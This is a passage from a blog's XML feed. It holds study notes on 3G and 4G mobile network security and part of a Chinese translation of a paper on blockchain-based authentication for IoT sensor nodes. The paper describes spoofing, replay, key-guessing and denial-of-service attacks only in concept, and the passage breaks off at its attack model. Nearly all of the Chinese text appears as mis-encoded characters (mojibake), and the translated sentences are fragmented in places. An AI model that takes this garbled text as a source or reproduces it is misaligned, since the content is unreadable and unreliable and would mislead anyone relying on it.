src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C25.png" alt="3"></p><p>+++</p><ul><li><p>3Gçš„å®‰å…¨ç›®æ ‡ï¼š</p><ul><li><p>å¯¹ç”¨æˆ·æ¨¡å—ï¼ˆUEï¼‰è¿›è¡Œ<strong>è®¤è¯</strong>ï¼Œç‰¹åˆ«æ˜¯ç”¨æˆ·æœåŠ¡æ ‡è¯†æ¨¡å—ï¼ˆUSIMï¼‰</p></li><li><p>å‘UEå’ŒæœåŠ¡ç½‘ç»œSNæä¾›<strong>ä¼šè¯å¯†é’¥</strong></p></li><li><p>åœ¨ä¼šè¯å¯†é’¥çš„ä¿æŠ¤ä¸‹åœ¨UEå’ŒSNä¹‹é—´<strong>å»ºç«‹å®‰å…¨è¿æ¥</strong></p></li></ul></li></ul><ul><li><p><strong>3Gçš„å±‚æ¬¡</strong>ï¼š</p><ol><li>åº”ç”¨å±‚</li><li>å½’å±/æœåŠ¡å±‚</li><li>ä¼ è¾“å±‚</li></ol></li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C26.png" alt="3"></p><p>+++</p><ul><li>3Gå®‰å…¨åŠŸèƒ½ç»“æ„</li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C27.png" alt="3"></p><ul><li>å¢å¼ºç”¨æˆ·èº«ä»½ä¿å¯†EUICï¼ˆ Enhanced User Identity Confidentialityï¼‰ï¼šé€šè¿‡å½’å±ç½‘å¯¹ç§»åŠ¨ç”¨æˆ·æ™ºèƒ½å¡èº«ä»½ä¿¡æ¯è¿›è¡Œè®¤è¯</li><li>ç”¨æˆ·èº«ä»½ä¿å¯†UICï¼ˆ User Identity Confidentialityï¼‰</li><li>è®¤è¯å’Œå¯†é’¥åå•†AKAï¼ˆ Authentication&amp; Key agreementï¼‰ï¼šç”¨äºUSIMå¡ã€VLRã€HLRé—´è¿›è¡ŒåŒå‘è®¤è¯å’Œå¯†é’¥åˆ†å‘</li><li>ç”¨æˆ·åŠä¿¡ä»¤æ•°æ®ä¿å¯†DCï¼šåŠ å¯†UEä¸RNCé—´ä¿¡æ¯</li><li>æ¶ˆæ¯è®¤è¯DIï¼šè®¤è¯æ¶ˆæ¯çš„å®Œæ•´æ€§ã€æ—¶æ•ˆä»¥åŠæ¶ˆæ¯çš„æ¥æºåœ°ä¸ç›®çš„åœ°</li></ul><p>+++</p><h4 id="3ã€4G"><a href="#3ã€4G" class="headerlink" title="3ã€4G"></a>3ã€4G</h4><ul><li><p><strong>4Gç³»ç»Ÿçš„ç»„æˆï¼š</strong></p><ul><li><p>ç§»åŠ¨ç»ˆç«¯</p></li><li><p>æ— çº¿æ¥å…¥ç½‘</p></li><li><p>æ— çº¿æ ¸å¿ƒç½‘</p></li><li><p>IPéª¨å¹²ç½‘</p></li></ul></li></ul><ul><li>4Gçš„å®‰å…¨å¨èƒ<ul><li>ç°æœ‰çš„æ— çº¿ç½‘ç»œå’ŒInternetçš„å®‰å…¨å¨èƒä¾ç„¶å­˜åœ¨<ul><li>4Gçš„ç»ˆç«¯ä¸å„ç§åº”ç”¨çš„äº¤äº’æ›´ä¸ºå¤æ‚ï¼Œå¨èƒä¹Ÿè¶Šå¤š</li></ul></li></ul></li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C28.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;+++&lt;/p&gt;
&lt;p&gt;1ã€Webå®‰å…¨&lt;/p&gt;
&lt;p&gt;2ã€é€†å‘å®‰å…¨&lt;/p&gt;
&lt;p&gt;3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨&lt;/p&gt;
&lt;h4 id=&quot;é¢˜å‹ï¼š&quot;&gt;&lt;a href=&quot;#é¢˜å‹ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é¢˜å‹ï¼š&quot;&gt;&lt;/a&gt;&lt;strong&gt;
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>P2P networking based internet of things (IoT) sensor node authentication by Blockchain</title>
    <link href="https://singlemindedt.github.io/2020/05/29/P2P%20networking%20based%20internet%20of%20things%20(IoT)%20sensor%20node%20authentication%20by%20Blockchain(%E5%9F%BA%E4%BA%8EP2P%E7%BD%91%E7%BB%9C%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%EF%BC%88IoT%EF%BC%89%E4%BC%A0%E6%84%9F%E5%99%A8%E8%8A%82%E7%82%B9%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AE%A4%E8%AF%81)/"/>
    <id>https://singlemindedt.github.io/2020/05/29/P2P networking based internet of things (IoT) sensor node authentication by Blockchain(åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯)/</id>
    <published>2020-05-29T10:20:08.000Z</published>
    <updated>2020-07-29T11:05:24.949Z</updated>
    
    <content type="html"><![CDATA[<h2 id="P2P-networking-based-internet-of-things-IoT-sensor-node-authentication-by-Blockchain-åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯"><a href="#P2P-networking-based-internet-of-things-IoT-sensor-node-authentication-by-Blockchain-åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯" class="headerlink" title="P2P networking based internet of things (IoT) sensor node authentication by Blockchain(åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯)"></a>P2P networking based internet of things (IoT) sensor node authentication by Blockchain(åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯)</h2><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><p>ä¼ æ„Ÿå™¨èŠ‚ç‚¹åœ¨ç‰©è”ç½‘ç¯å¢ƒä¸­èµ·ç€é‡è¦ä½œç”¨ï¼Œæ¯ä¸ªä¼ æ„Ÿå™¨éƒ½æ˜¯å¯¹ç­‰ç½‘ç»œã€‚ç”±äºç‰©ç†å°ºå¯¸æœ‰é™ï¼Œç‰©è”ç½‘ ä¼ æ„Ÿå™¨èŠ‚ç‚¹å¿…é¡»å…·æœ‰è½»é‡è®¤è¯åè®®ã€‚ç‰©è”ç½‘ï¼ˆIoTï¼‰æ˜¯å„ç§æŠ€æœ¯çš„é›†åˆ å…ƒç´ ã€‚æœŸæœ›å¼‚æ„ç»ˆç«¯ï¼Œç½‘ç»œå’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„äº’é€šã€‚ä»–ä»¬ä¼šåŠ é€Ÿ é€šè¿‡ç‰©è”ç½‘å¹³å°çš„å¼€æ”¾ã€‚ç»“æœï¼Œç‰©è”ç½‘å°†å‡ºç°è®¸å¤šæŠ€æœ¯å’Œç®¡ç†å®‰å…¨å¨èƒ ç¯å¢ƒã€‚ä¼ æ„Ÿå™¨èŠ‚ç‚¹åè®®å¿…é¡»è½»å·§ä¸”å®‰å…¨ã€‚ç”±äºç‰©è”ç½‘è®¾å¤‡æœ‰å¤šç§ç”¨é€”ï¼Œå› æ­¤ éœ€è¦æ€§èƒ½çš„è®¾å¤‡ï¼Œå…·æœ‰å¯æ­£å¸¸å·¥ä½œçš„é«˜æ€§èƒ½èŠ¯ç‰‡ç»„çš„æ“ä½œç³»ç»Ÿï¼Œå¤§å¤šæ•°å¯†ç åè®®ã€‚ä½†æ˜¯ï¼Œè½¬ ç‚¹äº®/ç†„ç­IoTè®¾å¤‡æ‰§è¡Œç®€å•çš„ä»»åŠ¡ï¼Œä¾‹å¦‚åŸºäºä¸è¿è¡ŒOSçš„ä½æ€§èƒ½èŠ¯ç‰‡ç»„ã€‚å¦‚æœæœ‰ ä¸æ”¯æŒåŠ å¯†åè®®æˆ–è¯ä¹¦ï¼Œåˆ™å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œå¹¶ä¸”æ€§èƒ½ä¸è¶³ä»¥å¤„ç†ã€‚å› æ­¤ï¼Œ æœ¬æ–‡æå‡ºäº†ä¸€ç§åŸºäºåŒºå—é“¾çš„ç‰©è”ç½‘è®¾å¤‡ï¼Œä»¥è·å–æ›´å®‰å…¨çš„èº«ä»½éªŒè¯æ–¹æ¡ˆã€‚</p><p><strong>Keywords</strong>ï¼š P2P networking . Sensor network . Secure IoT . Node authentication . Light-weight protocol . Network security</p><h3 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h3><p>ç‰©è”ç½‘ï¼ˆIoTï¼‰æœåŠ¡å®¹æ˜“å—åˆ°å„ç§æ”»å‡» ç‰©è”ç½‘æŠ€æœ¯çš„æœ¬è´¨å¸¦æ¥çš„å®‰å…¨å¨èƒã€‚ç‰¹åˆ«æ˜¯ï¼Œå®ƒå…·æœ‰æœ‰é™çš„ç¡¬ä»¶è§„æ ¼ï¼Œä¾‹å¦‚ä½åŠŸè€— æ¶ˆè€—ï¼Œå°‘é‡å†…å­˜ï¼Œä½å†…å­˜ç­‰ï¼Œ å¹¶ä¸”å¾€å¾€åˆ†å¸ƒåœ¨éš¾ä»¥ç®¡ç†çš„ç¯å¢ƒä¸­ï¼Œè¿™å¯èƒ½ä¼šå¸¦æ¥å„ç§å®‰å…¨å¨èƒ åŒ…æ‹¬ç‰©ç†æ”»å‡»çš„å› ç´ ã€‚è¿™äº›ç‰¹å¾å¯ä»¥ å¯¼è‡´ç‰©è”ç½‘æœåŠ¡å®‰å…¨è¿è¡Œä¸­çš„è‡´å‘½é”™è¯¯ å¹³å°æˆ–åŸºäºé”™è¯¯ä¿¡æ¯æä¾›æœåŠ¡ï¼Œ å¯¼è‡´ç‰©è”ç½‘æœåŠ¡å¹³å°å¤±å»å…¶åŠŸèƒ½[1]ã€‚ </p><p>è¿‘å¹´æ¥ï¼Œé¢„è®¡äº’æ“ä½œæ€§ å¼‚æ„ç»ˆç«¯ï¼Œç½‘ç»œå’Œåº”ç”¨ç¨‹åºä¹‹é—´ å°†é€šè¿‡ç‰©è”ç½‘å¹³å°çš„å¼€æ”¾è€ŒåŠ é€Ÿï¼Œ å¯¼è‡´å„ç§æŠ€æœ¯å’Œè¡Œæ”¿å®‰å…¨ å¨èƒã€‚ç‰©è”ç½‘ç¯å¢ƒä¸­å¯èƒ½å‘ç”Ÿçš„å®‰å…¨å¨èƒ ç»§æ‰¿ç°æœ‰å¨èƒä¸­å¯èƒ½å‘ç”Ÿçš„å¨èƒ ICTï¼ˆä¿¡æ¯å’Œé€šä¿¡æŠ€æœ¯ï¼‰ç¯å¢ƒã€‚æœºå¯†æ€§ï¼Œå®Œæ•´æ€§å’Œå¯ç”¨æ€§ï¼ˆCIAï¼‰å¯ä»¥ é€šå¸¸è¢«è§†ä¸ºå¯¹åˆæ³•å•†å“çš„ä½¿ç”¨å’Œäº¤ä»˜çš„å¨èƒ æœåŠ¡ï¼Œé€šå¸¸è¢«ç§°ä¸ºCIAï¼Œè¿™ä¸‰ä¸ªä¸»è¦ ä¿¡æ¯å®‰å…¨çš„ç»„æˆéƒ¨åˆ†[2]ã€‚è¡¨1æ˜¾ç¤ºäº† ç‰©è”ç½‘æ¯ä¸ªç»„ä»¶ä¸­å¯èƒ½å‘ç”Ÿçš„å®‰å…¨å¨èƒ[3]ã€‚ å› æ­¤ï¼Œç‰©è”ç½‘è®¾å¤‡éœ€è¦ä¸€ç§è®¿é—®æ§åˆ¶æ–¹æ³•æ¥ä¿æŠ¤è®¾å¤‡å…å—å•ä¸ªç”¨æˆ·çš„å¹³å°å†…èº«ä»½éªŒè¯ä»¥åŠæœªç»æˆæƒçš„ç”¨æˆ·å¯¹è®¾å¤‡çš„ä»»æ„è®¿é—®ã€‚ å„ç§ç¯å¢ƒå’Œå„ç§ç‰©è”ç½‘çš„æœåŠ¡å¹³å° æœåŠ¡å¹³å°å’Œå¹³å°åº”ç”¨ç¨‹åºæœåŠ¡[4-6]ã€‚</p><p>å½“å‰ç‰©è”ç½‘ç¯å¢ƒä¸­å¯èƒ½å‘ç”Ÿçš„å®‰å…¨é—®é¢˜ [3]ã€‚ å·²ç»å¼€å‘å‡ºå„ç§è®¤è¯åè®®ï¼Œç›´åˆ° æœ€è¿‘ã€‚ ä½†æ˜¯ï¼Œå¤§å¤šæ•°æè®®çš„èº«ä»½éªŒè¯åè®®éƒ½ç”¨äºè·Ÿè¸ªä½ç½®è·Ÿè¸ªæ”»å‡»çš„ä½ç½®ã€‚ ä¸€ä¸ª é‡æ’­æ”»å‡»æˆ–æ¬ºéª—æ”»å‡»æ˜“å—æ¬ºéª—æ”»å‡» [3]ã€‚ è®¸å¤šç½‘ç«™éƒ½æœ‰å¼±ç‚¹å’Œä¾µçŠ¯éšç§çš„è¡Œä¸ºã€‚ ç ”ç©¶äººå‘˜ æ­£åœ¨å‘ç°å®ƒ[5]ã€‚ å› æ­¤ï¼Œè¿™é¡¹ç ”ç©¶å·¥ä½œæå‡ºäº† åŸºäºåŒºå—é“¾çš„å¯¹ç­‰èº«ä»½éªŒè¯æ–¹æ¡ˆ ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œé“¾æ¥å’Œä¿æŠ¤ã€‚ æ¯ä¸ªå— å…·æœ‰å“ˆå¸ŒæŒ‡é’ˆï¼Œé€šå¸¸ä½œä¸ºæŒ‡å‘å‰ä¸€ä¸ªçš„ç¬¦å·é“¾æ¥ å—ï¼Œæ—¶é—´æˆ³å’Œäº¤æ˜“æ•°æ®[11]ã€‚ æ ¹æ®è®¾è®¡ï¼Œ åŒºå—é“¾å›ºæœ‰åœ°æŠ—æ‹’æ›´æ”¹æ•°æ®ã€‚</p><p>ä»æŠ€æœ¯ä¸Šè®²ï¼ŒåŒºå—é“¾å¯ä»¥å……å½“â€œä¸€ä¸ªå¼€æ”¾çš„ï¼Œåˆ†å¸ƒå¼çš„åˆ†ç±»å¸ï¼Œå¯ä»¥é«˜æ•ˆï¼Œå¯éªŒè¯ä¸”æ°¸ä¹…åœ°è®°å½•åŒæ–¹ä¹‹é—´çš„äº¤æ˜“â€ã€‚ [12]ç”¨ä½œ åˆ†æ•£çš„åˆ†ç±»å¸ï¼Œä¼ ç»Ÿä¸Šï¼ŒåŒºå—é“¾ç”± å¯¹ç­‰ç½‘ç»œèŠ‚ç‚¹å…±åŒéµå®ˆåè®® ç”¨äºéªŒè¯æ–°å—ã€‚è®°å½•åï¼Œä»»ä½•ç»™å®šçš„æ•°æ® å¦‚æœæ²¡æœ‰å…¨éƒ¨æ›´æ”¹ï¼Œåˆ™æ— æ³•è¿½æº¯æ›´æ”¹å— éšåçš„å—å’Œç½‘ç»œå¤šæ•°çš„å†²çª[13]ã€‚ åŒºå—é“¾æ¯”éåŒºå—é“¾ç®—æ³•æ›´å®‰å…¨[26]ã€‚ ä½†æ˜¯ï¼Œéœ€è¦åœ¨æ€§èƒ½å’Œå®‰å…¨æ€§ä¹‹é—´è¿›è¡Œæƒè¡¡ã€‚ å¦‚æœå®‰å…¨äº¤æ˜“æ¯”æ•ˆç‡æ›´é‡è¦ï¼Œé‚£ä¹ˆ åŒºå—é“¾æ˜¯ç‰©è”ç½‘é€šä¿¡çš„æœ€ä½³è§£å†³æ–¹æ¡ˆã€‚ å…¶ä½™ç ”ç©¶ç»„ç»‡å¦‚ä¸‹ã€‚ç¬¬äºŒèŠ‚ è®¨è®ºæ— çº¿æ–¹é¢ä¸€äº›å½“å‰å­˜åœ¨çš„åè®® ä¼ æ„Ÿå™¨ç½‘ç»œï¼ˆWSNï¼‰ç¬¬3å’Œ4èŠ‚ä»‹ç»äº†è¯¦ç»†ä¿¡æ¯ æå‡ºçš„ç®—æ³•ã€‚ç¬¬5èŠ‚æè¿°äº†ç»“è®º å’Œæœªæ¥çš„å·¥ä½œã€‚</p><h3 id="2-Related-work"><a href="#2-Related-work" class="headerlink" title="2 Related work"></a>2 Related work</h3><h4 id="2-1-Wireless-sensor-networks"><a href="#2-1-Wireless-sensor-networks" class="headerlink" title="2.1 Wireless sensor networks"></a>2.1 Wireless sensor networks</h4><p>WSNå¯ä»¥å¹¿æ³›åº”ç”¨äºå®æ—¶ç­‰é¢†åŸŸ äº¤é€šç›‘æ§ï¼Œå†›äº‹æ•°æ®æ”¶é›†ï¼Œåœ°éœ‡æ´»åŠ¨ åˆ†æ•£åº¦æµ‹é‡å’Œæ—¶é—´æ±¡æŸ“æµ‹é‡ã€‚ ç”±äºWSNç”±è¶…å°å‹ä¼ æ„Ÿå™¨ç»„æˆï¼Œå› æ­¤å­˜åœ¨ä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚å­˜å‚¨å†…å­˜ï¼Œè®¡ç®—é‡å’Œèƒ½é‡ é€šè®¯åŠå¾„ã€‚ æä¾›å®‰å…¨çš„æ— çº¿é€šä¿¡æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„é—®é¢˜ï¼Œå› ä¸ºä¼ æ„Ÿå™¨å¯èƒ½ä¼šæš´éœ²åœ¨æ¶åŠ£çš„ç¯å¢ƒä¸­ï¼Œå®¹æ˜“æ‹¦æˆªæ— çº¿ é€šè®¯ï¼Œæ¶æ„æ”»å‡»è€…å¯ä»¥ç¯¡æ”¹ æ¶ˆæ¯æˆ–å°è¯•é‡ä¼ æ”»å‡»[10]ã€‚</p><p>å®‰å…¨çš„WSNé€šä¿¡çš„å„ä¸ªæ–¹é¢ ç ”ç©¶ã€‚ WSNéå¸¸å®¹æ˜“å—åˆ°ä¼ æ„Ÿå™¨èŠ‚ç‚¹ï¼ˆSNï¼‰çš„ç¡¬ä»¶è®¾å¤‡ä»¥åŠèŠ‚ç‚¹æ£€æµ‹ï¼ŒæŸåï¼Œçªƒå¬ï¼Œ æ‹’ç»æœåŠ¡æ”»å‡»å’Œè·¯ç”±æ”»å‡»ï¼ˆä¾‹å¦‚ï¼Œæ¼æ´å’Œè •è™«æ¼æ´ï¼‰å–å†³äºæ— çº¿ç½‘ç»œçš„ç‰¹å¾[1]ã€‚</p><p>ç”±äºä¼ æ„Ÿå™¨èŠ‚ç‚¹çš„æ€§è´¨æœ‰é™ï¼Œå› æ­¤ä¸å®¹æ˜“ åº”ç”¨ç°æœ‰çš„WSNå®‰å…¨æŠ€æœ¯ã€‚ å› æ­¤ï¼Œ æ­£åœ¨ç ”ç©¶åŠ æƒå¯†é’¥åˆ†å‘å’Œè®¤è¯æ–¹æ¡ˆï¼Œä»¥å®ç°æ¶ˆæ¯ç­‰å®‰å…¨å› ç´  å®Œæ•´æ€§ï¼Œæœºå¯†æ€§å’ŒèŠ‚ç‚¹èº«ä»½éªŒè¯ã€‚</p><p>åº”ç”¨è½»é‡çº§å…¬é’¥æœ‰ä¸¤ç§æ–¹æ³• å…·æœ‰å¤§é‡ç°æœ‰è®¡ç®—ä»¥é€‚åˆ ä¼ æ„Ÿå™¨èŠ‚ç‚¹å’ŒÎ¼-TESLAï¼ˆå®šæ—¶çš„â€œå¾®å‹â€ç‰ˆæœ¬ï¼Œ é«˜æ•ˆï¼Œæµå¼ï¼Œå®¹é”™è®¤è¯åè®®ï¼‰ å’ŒLEAPï¼ˆè½»é‡çº§å¯æ‰©å±•èº«ä»½éªŒè¯åè®®ï¼‰ ä½è®¡ç®—èƒ½åŠ›å’Œå®‰å…¨å¯†é’¥åˆ†å‘çš„SPINSï¼ˆå®‰å…¨ç½‘ç»œåŠ å¯†åè®®ï¼‰[24]è®¾è®¡ [22]ã€‚ </p><p>PIKEï¼ˆå¯†é’¥å»ºç«‹åŒè¡Œæœºæ„ï¼‰[25]å…·æœ‰ æå‡ºäº†ä¸€ç§ç¡®ä¿ç½‘ç»œå®‰å…¨çš„å¯†é’¥åˆ†é…æ–¹æ¡ˆ åŸºäºå¯¹ç§°å¯†é’¥çš„å®‰å…¨æ€§åŸºäºå¯¹ç§°å¯†é’¥çš„å…¬å¼€ã€‚ å¦å¤–ï¼Œä¸éœ€è¦å¯†é’¥çš„åŸºäºIDçš„æ–¹æ¡ˆ åˆ†å¸ƒä»¥åŠåœ¨æ¶ˆæ¯ä¼ è¾“é¢‘ç‡ä¸Šå…·æœ‰ä¼˜åŠ¿çš„é—®é¢˜ä¹Ÿåœ¨ç ”ç©¶ä¸­ã€‚</p><p>ç”±äºæ— çº¿é€šä¿¡çš„æœ¬è´¨ï¼ŒWSNçš„ç¼ºç‚¹æ˜¯å®¹æ˜“çªƒå¬æ¶ˆæ¯[7]ã€‚ å› æ­¤ï¼Œä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µï¼Œæœ‰å¿…è¦é€šè¿‡åŠ å¯†å’Œäº¤æ¢æ•°æ®æ¥ç¡®ä¿æœºå¯†æ€§ã€‚</p><p>ä¸ºäº†ç”Ÿæˆè®¤è¯å¯†é’¥ï¼Œæ‰€æœ‰SNè¿›è¡Œé€šä¿¡ ç›´æ¥ä¸åŸºç«™ï¼ˆBSï¼‰ã€‚ å…¶å®å¾ˆéš¾ ä¸SNå’ŒBSç›´æ¥é€šä¿¡ã€‚ </p><p>å¦‚æœèƒ½é‡æœ‰é™çš„èŠ‚ç‚¹å°è¯•é€šä¿¡ ç›´æ¥ä¸è¿œç¨‹BSè¿›è¡Œé€šä¿¡ï¼Œåˆ™èƒ½è€—ä¸º é€šè¿‡å‘é€å’Œæ¥æ”¶èº«ä»½éªŒè¯æ¶ˆæ¯è€Œå¢åŠ ã€‚ æ¶ˆè€—è¿™ç§èƒ½é‡çš„èŠ‚ç‚¹ä¸èƒ½ é•¿æœŸå‚ä¸äº¤æµ[10]ã€‚</p><h3 id="2-2-Light-weight-sensor-networks-protocols"><a href="#2-2-Light-weight-sensor-networks-protocols" class="headerlink" title="2.2 Light-weight sensor networks protocols"></a>2.2 Light-weight sensor networks protocols</h3><p>æœ‰ä¸€äº›åŸºäºè½»é‡çº§å…¬é’¥çš„åè®®ï¼Œå¹¶ä¸” å®ƒä»¬æ˜¯ç”±Î¼-TESLA[21]ï¼ŒLEAP [22]å’ŒSPINS [23]è®¾è®¡çš„ å…·æœ‰è¾ƒä½çš„è®¡ç®—èƒ½åŠ›å’Œå®‰å…¨çš„å¯†é’¥åˆ†å‘ã€‚ ä¼ æ„Ÿå™¨èŠ‚ç‚¹åœ¨ç‰©è”ç½‘ç¯å¢ƒä¸­èµ·ç€é‡è¦ä½œç”¨ã€‚ ä¼ æ„Ÿå™¨ èŠ‚ç‚¹æ˜¯ç‰©è”ç½‘çš„å…³é”®ã€‚ å› æ­¤ï¼Œè®¸å¤šç ”ç©¶äººå‘˜æ­£åœ¨ä¸“æ³¨äº ä¼ æ„Ÿå™¨èŠ‚ç‚¹çš„æ”»å‡»æ‰¿å—èƒ½åŠ›å’Œæœ‰æ•ˆçš„é€šä¿¡ åè®®ã€‚</p><p>ç‰©è”ç½‘å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œè¯¦ç»†ä¿¡æ¯å¦‚ä¸‹ã€‚</p><p> äº’è”ç½‘åŸºäºICTï¼ˆäº’è”ç½‘é€šä¿¡ï¼‰ æŠ€æœ¯ï¼‰ï¼Œè¿™æ˜¯ä¸€ç§æ™ºèƒ½ç¯å¢ƒï¼Œå¯åœ¨ç”¨æˆ·ä¸å¯¹è±¡ä¹‹é—´ä»¥åŠå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´ä¼ é€’ä¿¡æ¯ é€šè¿‡è¿æ¥å·¥ä½œã€‚</p><p>ç¾å›½å¸‚åœºç ”ç©¶å…¬å¸Gartner é€‰æ‹©ç‰©è”ç½‘ä½œä¸ºæœ€å—å…³æ³¨çš„æŠ€æœ¯é¢†åŸŸ[8]ã€‚ ç‰©è”ç½‘æ˜¯ åˆ†ä¸ºä¸‰å¤§ç±»ï¼šè®¾å¤‡ï¼ˆç»ˆç«¯/ä¼ æ„Ÿå™¨ï¼‰ åŒºåŸŸï¼Œç½‘ç»œï¼ˆæœ‰çº¿/æ— çº¿ï¼‰åŒºåŸŸå’ŒæœåŠ¡æ¥å£ ï¼ˆå¹³å°/åº”ç”¨ç¨‹åºï¼‰åŒºåŸŸã€‚ è®¾å¤‡åŒºåŸŸä¼ è¾“æ•°æ® ä»ç‰¹å®šå¯¹è±¡æ”¶é›†å¹¶æå–åˆ°å¦ä¸€ä¸ªå¯¹è±¡ ä½¿ç”¨åµŒå…¥åœ¨å¯¹è±¡ä¸­çš„é€šä¿¡åŠŸèƒ½ã€‚ ç½‘ç»œåŒºåŸŸæ˜¯ä¸€ä¸ªæœ‰çº¿/æ— çº¿é€šé“ï¼Œç”¨äº ä¼ è¾“/æ¥æ”¶ç”¨æˆ·ä¸ å¯¹è±¡ï¼Œå¯¹è±¡åˆ°å¯¹è±¡ã€‚ æœåŠ¡æ¥å£åŒºåŸŸå¤„ç†æ•°æ®ä»¥ç”Ÿæˆä¿¡æ¯ï¼Œå¹¶æ§åˆ¶å’Œç®¡ç† å„ç§è®¾å¤‡ã€‚</p><h3 id="2-3-Vulnerability-on-IoT"><a href="#2-3-Vulnerability-on-IoT" class="headerlink" title="2.3 Vulnerability on IoT"></a>2.3 Vulnerability on IoT</h3><p>è™šå‡æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…ä¼ªè£…æˆ ä¼ æ„Ÿå™¨ç½‘ç»œä¸­çš„åˆæ³•æœåŠ¡å™¨ä»¥åŠå®¢æˆ·ç«¯ å‘å‡ºèº«ä»½éªŒè¯è¯·æ±‚ï¼Œç»§ç»­æ‰§è¡Œåè®®ï¼Œ éæ³•è·å–ä¼ æ„Ÿå™¨æˆ–ä¼ æ„Ÿå™¨çš„è®¤è¯å¯†é’¥ ç”¨æˆ·ã€‚é‡ä¼ æ”»å‡»æ˜¯æŒ‡åœ¨è®¤è¯è¿‡ç¨‹ä¸­ï¼Œå®ä½“ä¹‹é—´çš„è®¤è¯è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ç»„ä»¶ ä¼ æ„Ÿå™¨ç½‘ç»œå°†åœ¨åç»­çš„èº«ä»½éªŒè¯è¿‡ç¨‹ä¸­å­˜å‚¨å’Œé‡ç”¨[9]ã€‚</p><p> èº«ä»½éªŒè¯å¯†é’¥çŒœæµ‹æ”»å‡»æ˜¯å¯¹ æ”»å‡»è€…çªƒå¬æˆ–ä¼ªè£…ä¼ æ„Ÿå™¨ç½‘ç»œä¸­ç”¨æˆ·åˆ°ä¼ æ„Ÿå™¨ä¸ä¼ æ„Ÿå™¨åˆ°ä¼ æ„Ÿå™¨ä¹‹é—´çš„èº«ä»½éªŒè¯è¿‡ç¨‹ï¼Œå­˜å‚¨å‘é€å’Œæ¥æ”¶çš„å…ƒç´ ï¼Œå¹¶æ‰¾åˆ°ä¸æœ€ç»ˆå•†å®šçš„å¯†é’¥ç›¸åŒçš„å¯†é’¥ è®¤è¯å¯†é’¥[22]ã€‚ </p><p>æ‹’ç»æœåŠ¡æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…è¿›è¡Œçš„æ”»å‡» å‚ä¸èº«ä»½éªŒè¯è¿‡ç¨‹å¹¶æ‹¦æˆª å³ä½¿ä¼ æ„Ÿå™¨æˆ–ç”¨æˆ·è¯·æ±‚èº«ä»½éªŒè¯ä¹Ÿå¯ä»¥åšå‡ºå“åº”ï¼Œ ä»è€Œæ‹’ç»èº«ä»½éªŒè¯æœåŠ¡ã€‚ </p><p>éšç§ä¾µå®³æ˜¯ä¸€ç§ä¾µçŠ¯éšç§çš„è¡Œä¸ºï¼Œå®ƒé€šè¿‡ä»å‘é€çš„å…ƒç´ ä¸­æš´éœ²å‡ºå‚ä¸é€šä¿¡çš„ä¸»ä½“ å¹¶åœ¨ä¼ æ„Ÿå™¨ä¸Šçš„èº«ä»½éªŒè¯è¿‡ç¨‹ä¸­æ”¶åˆ° ç½‘ç»œã€‚</p><h3 id="2-4Attack-modelï¼ˆæ”»å‡»æ¨¡å‹-ï¼‰"><a href="#2-4Attack-modelï¼ˆæ”»å‡»æ¨¡å‹-ï¼‰" class="headerlink" title="2.4Attack modelï¼ˆæ”»å‡»æ¨¡å‹ ï¼‰"></a>2.4Attack modelï¼ˆæ”»å‡»æ¨¡å‹ ï¼‰</h3><p>æœ¬ç ”ç©¶ä¸­çš„æ”»å‡»æ¨¡å‹å¯ä»¥æ˜¯DoSæ”»å‡»ã€‚ åœ¨DoSä¸­ æ”»å‡»ï¼Œæ”»å‡»è€…æ­£è¯•å›¾é€ƒé¿æˆ–å†’å…… é€šè¿‡å‘é€ä¼ªè£…çš„å‡æ¶ˆæ¯æ¥åˆæ³•çš„IoTè®¾å¤‡ 